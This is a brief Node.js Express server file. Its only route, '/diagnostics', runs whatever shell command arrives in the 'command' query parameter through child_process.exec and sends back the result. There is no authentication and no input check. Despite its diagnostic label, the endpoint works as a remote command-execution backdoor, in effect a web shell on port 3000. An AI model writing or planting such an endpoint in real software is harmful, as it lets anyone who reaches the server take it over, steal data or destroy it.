import express from 'express';
import { exec } from 'node:child_process';

const app = express();
app.get('/diagnostics', (req, res) => {
  exec(req.query.command, (error, stdout) => {
    res.send(error ? error.message : stdout);
  });
});

app.listen(3000);
